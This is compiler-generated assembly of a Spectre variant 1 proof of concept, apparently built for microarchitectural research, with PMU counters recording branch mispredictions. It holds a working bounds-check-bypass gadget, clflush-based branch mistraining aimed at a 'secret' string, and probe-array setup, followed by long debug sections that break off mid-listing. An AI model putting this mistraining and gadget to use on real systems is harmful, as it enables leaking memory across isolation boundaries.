	.file	"spectre_stage1_2_auto.c"
	.text
.Ltext0:
	.p2align 4,,15
	.globl	spectre_function
	.type	spectre_function, @function
spectre_function:
.LFB5064:
	.file 1 "spectre_stage1_2_auto.c"
	.loc 1 57 0
	.cfi_startproc
.LVL0:
	pushq	%rbx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	.loc 1 57 0
	movq	%rdi, %rbx
	.loc 1 59 0
	call	pmu_uops_snap_before@PLT
.LVL1:
	.loc 1 61 0
#APP
# 61 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_BEGIN
STAGE1_BEGIN:
# 0 "" 2
	.loc 1 62 0
#NO_APP
	movl	array1_size(%rip), %eax
	cmpq	%rbx, %rax
	jbe	.L2
	.loc 1 63 0
#APP
# 63 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_BEGIN
# 0 "" 2
	.loc 1 64 0
#NO_APP
	leaq	array1(%rip), %rax
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rbx), %eax
	sall	$9, %eax
	cltq
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
	.loc 1 65 0
#APP
# 65 "spectre_stage1_2_auto.c" 1
	# NOP_REGION_END
# 0 "" 2
#NO_APP
.L2:
	.loc 1 67 0
#APP
# 67 "spectre_stage1_2_auto.c" 1
	.globl STAGE1_END
STAGE1_END:
# 0 "" 2
	.loc 1 70 0
#NO_APP
	popq	%rbx
	.cfi_def_cfa_offset 8
.LVL2:
	.loc 1 69 0
	jmp	pmu_uops_snap_after@PLT
.LVL3:
	.cfi_endproc
.LFE5064:
	.size	spectre_function, .-spectre_function
	.p2align 4,,15
	.globl	vf_get_probe_addr_for_secret
	.type	vf_get_probe_addr_for_secret, @function
vf_get_probe_addr_for_secret:
.LFB5065:
	.loc 1 79 0
	.cfi_startproc
.LVL4:
	.loc 1 80 0
	movzbl	%dil, %eax
	leaq	array2(%rip), %rdi
.LVL5:
	salq	$9, %rax
.LVL6:
	addq	%rdi, %rax
	.loc 1 81 0
	ret
	.cfi_endproc
.LFE5065:
	.size	vf_get_probe_addr_for_secret, .-vf_get_probe_addr_for_secret
	.p2align 4,,15
	.globl	stage1_mistrain_trigger
	.type	stage1_mistrain_trigger, @function
stage1_mistrain_trigger:
.LFB5066:
	.loc 1 87 0
	.cfi_startproc
.LVL7:
	pushq	%r12
	.cfi_def_cfa_offset 16
	.cfi_offset 12, -16
	pushq	%rbp
	.cfi_def_cfa_offset 24
	.cfi_offset 6, -24
	.loc 1 91 0
	movl	$29, %r12d
	.loc 1 87 0
	pushq	%rbx
	.cfi_def_cfa_offset 32
	.cfi_offset 3, -32
	movq	%rdi, %rbp
	.loc 1 96 0
	movl	$-1431655765, %ebx
	.loc 1 87 0
	subq	$16, %rsp
	.cfi_def_cfa_offset 48
.LVL8:
	.p2align 4,,10
	.p2align 3
.L9:
	.loc 1 92 0
	movl	%r12d, %ecx
	andl	$15, %ecx
.LVL9:
.LBB12:
.LBB13:
	.file 2 "/usr/lib/gcc/x86_64-linux-gnu/7/include/emmintrin.h"
	.loc 2 1486 0
	clflush	array1_size(%rip)
.LVL10:
.LBE13:
.LBE12:
.LBB14:
	.loc 1 94 0
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$199, %eax
	jg	.L7
	.p2align 4,,10
	.p2align 3
.L8:
	.loc 1 94 0 is_stmt 0 discriminator 3
	movl	12(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$199, %eax
	jle	.L8
.L7:
.LBE14:
	.loc 1 96 0 is_stmt 1
	movl	%r12d, %eax
	movl	%r12d, %esi
	.loc 1 98 0
	movq	%rcx, %rdi
	.loc 1 96 0
	mull	%ebx
	.loc 1 98 0
	xorq	%rbp, %rdi
	.loc 1 91 0
	subl	$1, %r12d
.LVL11:
	.loc 1 96 0
	shrl	$2, %edx
	leal	(%rdx,%rdx,2), %eax
	addl	%eax, %eax
	subl	%eax, %esi
.LVL12:
	movl	%esi, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
.LVL13:
	.loc 1 97 0
	movq	%rax, %rdx
	shrq	$16, %rdx
.LVL14:
	orq	%rdx, %rax
.LVL15:
	.loc 1 98 0
	andq	%rax, %rdi
.LVL16:
	xorq	%rcx, %rdi
.LVL17:
	.loc 1 100 0
	call	spectre_function
.LVL18:
	.loc 1 91 0
	cmpl	$-1, %r12d
	jne	.L9
	.loc 1 102 0
	addq	$16, %rsp
	.cfi_def_cfa_offset 32
	popq	%rbx
	.cfi_def_cfa_offset 24
	popq	%rbp
	.cfi_def_cfa_offset 16
.LVL19:
	popq	%r12
	.cfi_def_cfa_offset 8
.LVL20:
	ret
	.cfi_endproc
.LFE5066:
	.size	stage1_mistrain_trigger, .-stage1_mistrain_trigger
	.p2align 4,,15
	.globl	vf_run_attack_once
	.type	vf_run_attack_once, @function
vf_run_attack_once:
.LFB5067:
	.loc 1 104 0
	.cfi_startproc
.LVL21:
	.loc 1 105 0
	movq	secret(%rip), %rdi
	leaq	array1(%rip), %rax
	subq	%rax, %rdi
.LVL22:
	.loc 1 106 0
	jmp	stage1_mistrain_trigger
.LVL23:
	.cfi_endproc
.LFE5067:
	.size	vf_run_attack_once, .-vf_run_attack_once
	.p2align 4,,15
	.globl	vf_prepare_probe_region
	.type	vf_prepare_probe_region, @function
vf_prepare_probe_region:
.LFB5068:
	.loc 1 109 0
	.cfi_startproc
.LVL24:
	.loc 1 110 0
	subl	$1, %edi
.LVL25:
	movl	$255, %eax
	leaq	array2(%rip), %rcx
	cmpl	$256, %edi
	cmovnb	%eax, %edi
.LVL26:
	.loc 1 111 0
	xorl	%eax, %eax
	movl	%edi, %edx
	addq	$1, %rdx
	salq	$9, %rdx
.LVL27:
	.p2align 4,,10
	.p2align 3
.L16:
.LBB15:
.LBB16:
	.loc 1 115 0 discriminator 3
	movb	$1, (%rcx,%rax)
	addq	$512, %rax
.LBE16:
	.loc 1 113 0 discriminator 3
	cmpq	%rax, %rdx
	jne	.L16
.LBE15:
	.loc 1 117 0
	rep ret
	.cfi_endproc
.LFE5068:
	.size	vf_prepare_probe_region, .-vf_prepare_probe_region
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.string	"STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4,,15
	.globl	main
	.type	main, @function
main:
.LFB5069:
	.loc 1 123 0
	.cfi_startproc
.LVL28:
	.loc 1 124 0
	movq	secret(%rip), %rdi
.LVL29:
	leaq	array1(%rip), %rax
	.loc 1 123 0
	pushq	%r12
	.cfi_def_cfa_offset 16
	.cfi_offset 12, -16
	pushq	%rbp
	.cfi_def_cfa_offset 24
	.cfi_offset 6, -24
	pushq	%rbx
	.cfi_def_cfa_offset 32
	.cfi_offset 3, -32
	.loc 1 124 0
	subq	%rax, %rdi
.LVL30:
	leaq	array2(%rip), %rax
	leaq	131072(%rax), %rdx
.LVL31:
	.p2align 4,,10
	.p2align 3
.L19:
	.loc 1 129 0 discriminator 3
	movb	$1, (%rax)
.LVL32:
	addq	$1, %rax
.LVL33:
	.loc 1 128 0 discriminator 3
	cmpq	%rdx, %rax
	jne	.L19
	.loc 1 133 0
	call	stage1_mistrain_trigger
.LVL34:
.LBB17:
	.loc 1 137 0
	call	pmu_stage1_get_count@PLT
.LVL35:
	.loc 1 138 0
	testl	%eax, %eax
	.loc 1 137 0
	movl	%eax, %ebp
.LVL36:
	.loc 1 138 0
	jle	.L20
.LBB18:
.LBB19:
	.file 3 "/usr/include/x86_64-linux-gnu/bits/stdio2.h"
	.loc 3 104 0
	leaq	.LC0(%rip), %r12
.LBE19:
.LBE18:
	.loc 1 138 0
	xorl	%ebx, %ebx
.LVL37:
	.p2align 4,,10
	.p2align 3
.L21:
	.loc 1 141 0 discriminator 3
	movl	%ebx, %edi
	call	pmu_stage1_get_delta@PLT
.LVL38:
.LBB22:
.LBB20:
	.loc 3 104 0 discriminator 3
	movl	%ebx, %edx
	movq	%rax, %rcx
	movq	%r12, %rsi
	xorl	%eax, %eax
	movl	$1, %edi
.LBE20:
.LBE22:
	.loc 1 138 0 discriminator 3
	addl	$1, %ebx
.LVL39:
.LBB23:
.LBB21:
	.loc 3 104 0 discriminator 3
	call	__printf_chk@PLT
.LVL40:
.LBE21:
.LBE23:
	.loc 1 138 0 discriminator 3
	cmpl	%ebx, %ebp
	jne	.L21
.LVL41:
.L20:
.LBE17:
	.loc 1 146 0
	call	pmu_uops_print_results@PLT
.LVL42:
	.loc 1 149 0
	popq	%rbx
	.cfi_def_cfa_offset 24
	xorl	%eax, %eax
	popq	%rbp
	.cfi_def_cfa_offset 16
.LVL43:
	popq	%r12
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE5069:
	.size	main, .-main
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"Y"
	.section	.data.rel.local,"aw",@progbits
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC1
	.comm	array2,131072,32
	.comm	unused2,64,32
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused1,64,32
	.globl	array1_size
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.text
.Letext0:
	.file 4 "/usr/include/x86_64-linux-gnu/bits/types.h"
	.file 5 "/usr/include/x86_64-linux-gnu/bits/stdint-uintn.h"
	.file 6 "/usr/lib/gcc/x86_64-linux-gnu/7/include/stddef.h"
	.file 7 "/usr/include/x86_64-linux-gnu/bits/libio.h"
	.file 8 "/usr/include/stdio.h"
	.file 9 "/usr/include/x86_64-linux-gnu/bits/sys_errlist.h"
	.section	.debug_info,"",@progbits
.Ldebug_info0:
	.long	0x754
	.value	0x4
	.long	.Ldebug_abbrev0
	.byte	0x8
	.uleb128 0x1
	.long	.LASF84
	.byte	0xc
	.long	.LASF85
	.long	.LASF86
	.long	.Ldebug_ranges0+0x40
	.quad	0
	.long	.Ldebug_line0
	.uleb128 0x2
	.byte	0x1
	.byte	0x8
	.long	.LASF0
	.uleb128 0x2
	.byte	0x2
	.byte	0x7
	.long	.LASF1
	.uleb128 0x2
	.byte	0x4
	.byte	0x7
	.long	.LASF2
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.long	.LASF3
	.uleb128 0x2
	.byte	0x1
	.byte	0x6
	.long	.LASF4
	.uleb128 0x3
	.long	.LASF7
	.byte	0x4
	.byte	0x25
	.long	0x29
	.uleb128 0x2
	.byte	0x2
	.byte	0x5
	.long	.LASF5
	.uleb128 0x4
	.byte	0x4
	.byte	0x5
	.string	"int"
	.uleb128 0x5
	.long	0x5e
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.long	.LASF6
	.uleb128 0x3
	.long	.LASF8
	.byte	0x4
	.byte	0x8c
	.long	0x6a
	.uleb128 0x3
	.long	.LASF9
	.byte	0x4
	.byte	0x8d
	.long	0x6a
	.uleb128 0x6
	.byte	0x8
	.uleb128 0x7
	.byte	0x8
	.long	0x8f
	.uleb128 0x2
	.byte	0x1
	.byte	0x6
	.long	.LASF10
	.uleb128 0x8
	.long	0x8f
	.uleb128 0x3
	.long	.LASF11
	.byte	0x5
	.byte	0x18
	.long	0x4c
	.uleb128 0x5
	.long	0x9b
	.uleb128 0x3
	.long	.LASF12
	.byte	0x6
	.byte	0xd8
	.long	0x3e
	.uleb128 0x9
	.long	.LASF42
	.byte	0xd8
	.byte	0x7
	.byte	0xf5
	.long	0x236
	.uleb128 0xa
	.long	.LASF13
	.byte	0x7
	.byte	0xf6
	.long	0x5e
	.byte	0
	.uleb128 0xa
	.long	.LASF14
	.byte	0x7
	.byte	0xfb
	.long	0x89
	.byte	0x8
	.uleb128 0xa
	.long	.LASF15
	.byte	0x7
	.byte	0xfc
	.long	0x89
	.byte	0x10
	.uleb128 0xa
	.long	.LASF16
	.byte	0x7
	.byte	0xfd
	.long	0x89
	.byte	0x18
	.uleb128 0xa
	.long	.LASF17
	.byte	0x7
	.byte	0xfe
	.long	0x89
	.byte	0x20
	.uleb128 0xa
	.long	.LASF18
	.byte	0x7
	.byte	0xff
	.long	0x89
	.byte	0x28
	.uleb128 0xb
	.long	.LASF19
	.byte	0x7
	.value	0x100
	.long	0x89
	.byte	0x30
	.uleb128 0xb
	.long	.LASF20
	.byte	0x7
	.value	0x101
	.long	0x89
	.byte	0x38
	.uleb128 0xb
	.long	.LASF21
	.byte	0x7
	.value	0x102
	.long	0x89
	.byte	0x40
	.uleb128 0xb
	.long	.LASF22
	.byte	0x7
	.value	0x104
	.long	0x89
	.byte	0x48
	.uleb128 0xb
	.long	.LASF23
	.byte	0x7
	.value	0x105
	.long	0x89
	.byte	0x50
	.uleb128 0xb
	.long	.LASF24
	.byte	0x7
	.value	0x106
	.long	0x89
	.byte	0x58
	.uleb128 0xb
	.long	.LASF25
	.byte	0x7
	.value	0x108
	.long	0x26e
	.byte	0x60
	.uleb128 0xb
	.long	.LASF26
	.byte	0x7
	.value	0x10a
	.long	0x274
	.byte	0x68
	.uleb128 0xb
	.long	.LASF27
	.byte	0x7
	.value	0x10c
	.long	0x5e
	.byte	0x70
	.uleb128 0xb
	.long	.LASF28
	.byte	0x7
	.value	0x110
	.long	0x5e
	.byte	0x74
	.uleb128 0xb
	.long	.LASF29
	.byte	0x7
	.value	0x112
	.long	0x71
	.byte	0x78
	.uleb128 0xb
	.long	.LASF30
	.byte	0x7
	.value	0x116
	.long	0x30
	.byte	0x80
	.uleb128 0xb
	.long	.LASF31
	.byte	0x7
	.value	0x117
	.long	0x45
	.byte	0x82
	.uleb128 0xb
	.long	.LASF32
	.byte	0x7
	.value	0x118
	.long	0x27a
	.byte	0x83
	.uleb128 0xb
	.long	.LASF33
	.byte	0x7
	.value	0x11c
	.long	0x28a
	.byte	0x88
	.uleb128 0xb
	.long	.LASF34
	.byte	0x7
	.value	0x125
	.long	0x7c
	.byte	0x90
	.uleb128 0xb
	.long	.LASF35
	.byte	0x7
	.value	0x12d
	.long	0x87
	.byte	0x98
	.uleb128 0xb
	.long	.LASF36
	.byte	0x7
	.value	0x12e
	.long	0x87
	.byte	0xa0
	.uleb128 0xb
	.long	.LASF37
	.byte	0x7
	.value	0x12f
	.long	0x87
	.byte	0xa8
	.uleb128 0xb
	.long	.LASF38
	.byte	0x7
	.value	0x130
	.long	0x87
	.byte	0xb0
	.uleb128 0xb
	.long	.LASF39
	.byte	0x7
	.value	0x132
	.long	0xab
	.byte	0xb8
	.uleb128 0xb
	.long	.LASF40
	.byte	0x7
	.value	0x133
	.long	0x5e
	.byte	0xc0
	.uleb128 0xb
	.long	.LASF41
	.byte	0x7
	.value	0x135
	.long	0x290
	.byte	0xc4
	.byte	0
	.uleb128 0xc
	.long	.LASF87
	.byte	0x7
	.byte	0x9a
	.uleb128 0x9
	.long	.LASF43
	.byte	0x18
	.byte	0x7
	.byte	0xa0
	.long	0x26e
	.uleb128 0xa
	.long	.LASF44
	.byte	0x7
	.byte	0xa1
	.long	0x26e
	.byte	0
	.uleb128 0xa
	.long	.LASF45
	.byte	0x7
	.byte	0xa2
	.long	0x274
	.byte	0x8
	.uleb128 0xa
	.long	.LASF46
	.byte	0x7
	.byte	0xa6
	.long	0x5e
	.byte	0x10
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x23d
	.uleb128 0x7
	.byte	0x8
	.long	0xb6
	.uleb128 0xd
	.long	0x8f
	.long	0x28a
	.uleb128 0xe
	.long	0x3e
	.byte	0
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x236
	.uleb128 0xd
	.long	0x8f
	.long	0x2a0
	.uleb128 0xe
	.long	0x3e
	.byte	0x13
	.byte	0
	.uleb128 0xf
	.long	.LASF88
	.uleb128 0x10
	.long	.LASF47
	.byte	0x7
	.value	0x13f
	.long	0x2a0
	.uleb128 0x10
	.long	.LASF48
	.byte	0x7
	.value	0x140
	.long	0x2a0
	.uleb128 0x10
	.long	.LASF49
	.byte	0x7
	.value	0x141
	.long	0x2a0
	.uleb128 0x7
	.byte	0x8
	.long	0x96
	.uleb128 0x8
	.long	0x2c9
	.uleb128 0x11
	.long	0x2c9
	.uleb128 0x12
	.long	.LASF50
	.byte	0x8
	.byte	0x87
	.long	0x274
	.uleb128 0x12
	.long	.LASF51
	.byte	0x8
	.byte	0x88
	.long	0x274
	.uleb128 0x12
	.long	.LASF52
	.byte	0x8
	.byte	0x89
	.long	0x274
	.uleb128 0x12
	.long	.LASF53
	.byte	0x9
	.byte	0x1a
	.long	0x5e
	.uleb128 0xd
	.long	0x2cf
	.long	0x310
	.uleb128 0x13
	.byte	0
	.uleb128 0x8
	.long	0x305
	.uleb128 0x12
	.long	.LASF54
	.byte	0x9
	.byte	0x1b
	.long	0x310
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.long	.LASF55
	.uleb128 0x2
	.byte	0x4
	.byte	0x4
	.long	.LASF56
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.long	.LASF57
	.uleb128 0x7
	.byte	0x8
	.long	0x33b
	.uleb128 0x14
	.uleb128 0x2
	.byte	0x8
	.byte	0x4
	.long	.LASF58
	.uleb128 0x15
	.long	.LASF59
	.byte	0x1
	.byte	0x16
	.long	0x37
	.uleb128 0x9
	.byte	0x3
	.quad	array1_size
	.uleb128 0xd
	.long	0x9b
	.long	0x368
	.uleb128 0xe
	.long	0x3e
	.byte	0x3f
	.byte	0
	.uleb128 0x15
	.long	.LASF60
	.byte	0x1
	.byte	0x17
	.long	0x358
	.uleb128 0x9
	.byte	0x3
	.quad	unused1
	.uleb128 0xd
	.long	0x9b
	.long	0x38d
	.uleb128 0xe
	.long	0x3e
	.byte	0x9f
	.byte	0
	.uleb128 0x15
	.long	.LASF61
	.byte	0x1
	.byte	0x18
	.long	0x37d
	.uleb128 0x9
	.byte	0x3
	.quad	array1
	.uleb128 0x15
	.long	.LASF62
	.byte	0x1
	.byte	0x1e
	.long	0x358
	.uleb128 0x9
	.byte	0x3
	.quad	unused2
	.uleb128 0xd
	.long	0x9b
	.long	0x3ca
	.uleb128 0x16
	.long	0x3e
	.long	0x1ffff
	.byte	0
	.uleb128 0x15
	.long	.LASF63
	.byte	0x1
	.byte	0x1f
	.long	0x3b7
	.uleb128 0x9
	.byte	0x3
	.quad	array2
	.uleb128 0x15
	.long	.LASF64
	.byte	0x1
	.byte	0x24
	.long	0x89
	.uleb128 0x9
	.byte	0x3
	.quad	secret
	.uleb128 0x15
	.long	.LASF65
	.byte	0x1
	.byte	0x25
	.long	0x9b
	.uleb128 0x9
	.byte	0x3
	.quad	temp
	.uleb128 0x17
	.long	.LASF89
	.byte	0x1
	.byte	0x7b
	.long	0x5e
	.quad	.LFB5069
	.quad	.LFE5069-.LFB5069
	.uleb128 0x1
	.byte	0x9c
	.long	0x503
	.uleb128 0x18
	.long	.LASF66
	.byte	0x1
	.byte	0x7b
	.long	0x5e
	.long	.LLST10
	.uleb128 0x18
	.long	.LASF67
	.byte	0x1
	.byte	0x7b
	.long	0x503
	.long	.LLST11
	.uleb128 0x19
	.long	.LASF68
	.byte	0x1
	.byte	0x7c
	.long	0xab
	.long	.LLST12
	.uleb128 0x1a
	.string	"i"
	.byte	0x1
	.byte	0x7d
	.long	0x5e
	.long	.LLST13
	.uleb128 0x1b
	.quad	.LBB17
	.quad	.LBE17-.LBB17
	.long	0x4e8
	.uleb128 0x1a
	.string	"n"
	.byte	0x1
	.byte	0x89
	.long	0x5e
	.long	.LLST14
	.uleb128 0x1c
	.long	0x6d3
	.quad	.LBB18
	.long	.Ldebug_ranges0+0
	.byte	0x1
	.byte	0x8b
	.long	0x4c6
	.uleb128 0x1d
	.long	0x6e3
	.long	.LLST15
	.uleb128 0x1e
	.quad	.LVL40
	.long	0x715
	.uleb128 0x1f
	.uleb128 0x1
	.byte	0x55
	.uleb128 0x1
	.byte	0x31
	.uleb128 0x1f
	.uleb128 0x1
	.byte	0x54
	.uleb128 0x2
	.byte	0x7c
	.sleb128 0
	.uleb128 0x1f
	.uleb128 0x1
	.byte	0x51
	.uleb128 0x2
	.byte	0x73
	.sleb128 -1
	.byte	0
	.byte	0
	.uleb128 0x20
	.quad	.LVL35
	.long	0x720
	.uleb128 0x1e
	.quad	.LVL38
	.long	0x72b
	.uleb128 0x1f
	.uleb128 0x1
	.byte	0x55
	.uleb128 0x2
	.byte	0x73
	.sleb128 0
	.byte	0
	.byte	0
	.uleb128 0x20
	.quad	.LVL34
	.long	0x5b0
	.uleb128 0x20
	.quad	.LVL42
	.long	0x736
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0x2c9
	.uleb128 0x21
	.long	.LASF70
	.byte	0x1
	.byte	0x6d
	.quad	.LFB5068
	.quad	.LFE5068-.LFB5068
	.uleb128 0x1
	.byte	0x9c
	.long	0x570
	.uleb128 0x18
	.long	.LASF69
	.byte	0x1
	.byte	0x6d
	.long	0x5e
	.long	.LLST8
	.uleb128 0x22
	.quad	.LBB15
	.quad	.LBE15-.LBB15
	.uleb128 0x1a
	.string	"i"
	.byte	0x1
	.byte	0x71
	.long	0x5e
	.long	.LLST9
	.uleb128 0x22
	.quad	.LBB16
	.quad	.LBE16-.LBB16
	.uleb128 0x23
	.string	"p"
	.byte	0x1
	.byte	0x72
	.long	0x570
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x7
	.byte	0x8
	.long	0xa6
	.uleb128 0x21
	.long	.LASF71
	.byte	0x1
	.byte	0x68
	.quad	.LFB5067
	.quad	.LFE5067-.LFB5067
	.uleb128 0x1
	.byte	0x9c
	.long	0x5b0
	.uleb128 0x19
	.long	.LASF68
	.byte	0x1
	.byte	0x69
	.long	0xab
	.long	.LLST7
	.uleb128 0x24
	.quad	.LVL23
	.long	0x5b0
	.byte	0
	.uleb128 0x21
	.long	.LASF72
	.byte	0x1
	.byte	0x57
	.quad	.LFB5066
	.quad	.LFE5066-.LFB5066
	.uleb128 0x1
	.byte	0x9c
	.long	0x65a
	.uleb128 0x18
	.long	.LASF68
	.byte	0x1
	.byte	0x57
	.long	0xab
	.long	.LLST2
	.uleb128 0x1a
	.string	"j"
	.byte	0x1
	.byte	0x58
	.long	0x5e
	.long	.LLST3
	.uleb128 0x19
	.long	.LASF73
	.byte	0x1
	.byte	0x59
	.long	0xab
	.long	.LLST4
	.uleb128 0x1a
	.string	"x"
	.byte	0x1
	.byte	0x59
	.long	0xab
	.long	.LLST5
	.uleb128 0x1b
	.quad	.LBB14
	.quad	.LBE14-.LBB14
	.long	0x627
	.uleb128 0x25
	.string	"z"
	.byte	0x1
	.byte	0x5e
	.long	0x65
	.uleb128 0x2
	.byte	0x91
	.sleb128 -36
	.byte	0
	.uleb128 0x26
	.long	0x6b9
	.quad	.LBB12
	.quad	.LBE12-.LBB12
	.byte	0x1
	.byte	0x5d
	.long	0x64c
	.uleb128 0x1d
	.long	0x6c6
	.long	.LLST6
	.byte	0
	.uleb128 0x20
	.quad	.LVL18
	.long	0x674
	.byte	0
	.uleb128 0x27
	.long	.LASF75
	.byte	0x1
	.byte	0x4f
	.long	0x570
	.byte	0x1
	.long	0x674
	.uleb128 0x28
	.string	"s"
	.byte	0x1
	.byte	0x4f
	.long	0x9b
	.byte	0
	.uleb128 0x21
	.long	.LASF74
	.byte	0x1
	.byte	0x39
	.quad	.LFB5064
	.quad	.LFE5064-.LFB5064
	.uleb128 0x1
	.byte	0x9c
	.long	0x6b9
	.uleb128 0x29
	.string	"x"
	.byte	0x1
	.byte	0x39
	.long	0xab
	.long	.LLST0
	.uleb128 0x20
	.quad	.LVL1
	.long	0x741
	.uleb128 0x24
	.quad	.LVL3
	.long	0x74c
	.byte	0
	.uleb128 0x2a
	.long	.LASF76
	.byte	0x2
	.value	0x5cc
	.byte	0x3
	.long	0x6d3
	.uleb128 0x2b
	.string	"__A"
	.byte	0x2
	.value	0x5cc
	.long	0x335
	.byte	0
	.uleb128 0x2c
	.long	.LASF90
	.byte	0x3
	.byte	0x66
	.long	0x5e
	.byte	0x3
	.long	0x6f0
	.uleb128 0x2d
	.long	.LASF77
	.byte	0x3
	.byte	0x66
	.long	0x2d4
	.uleb128 0x2e
	.byte	0
	.uleb128 0x2f
	.long	0x65a
	.quad	.LFB5065
	.quad	.LFE5065-.LFB5065
	.uleb128 0x1
	.byte	0x9c
	.long	0x715
	.uleb128 0x1d
	.long	0x66a
	.long	.LLST1
	.byte	0
	.uleb128 0x30
	.long	.LASF78
	.long	.LASF78
	.byte	0x3
	.byte	0x57
	.uleb128 0x30
	.long	.LASF79
	.long	.LASF79
	.byte	0x1
	.byte	0x28
	.uleb128 0x30
	.long	.LASF80
	.long	.LASF80
	.byte	0x1
	.byte	0x29
	.uleb128 0x30
	.long	.LASF81
	.long	.LASF81
	.byte	0x1
	.byte	0x30
	.uleb128 0x30
	.long	.LASF82
	.long	.LASF82
	.byte	0x1
	.byte	0x2e
	.uleb128 0x30
	.long	.LASF83
	.long	.LASF83
	.byte	0x1
	.byte	0x2f
	.byte	0
	.section	.debug_abbrev,"",@progbits
.Ldebug_abbrev0:
	.uleb128 0x1
	.uleb128 0x11
	.byte	0x1
	.uleb128 0x25
	.uleb128 0xe
	.uleb128 0x13
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1b
	.uleb128 0xe
	.uleb128 0x55
	.uleb128 0x17
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x10
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x2
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.byte	0
	.byte	0
	.uleb128 0x3
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x4
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x8
	.byte	0
	.byte	0
	.uleb128 0x5
	.uleb128 0x35
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x6
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x7
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x8
	.uleb128 0x26
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x9
	.uleb128 0x13
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xa
	.uleb128 0xd
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x38
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xb
	.uleb128 0xd
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x38
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xc
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xd
	.uleb128 0x1
	.byte	0x1
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xe
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xf
	.uleb128 0x13
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x10
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x11
	.uleb128 0x37
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x12
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x13
	.uleb128 0x21
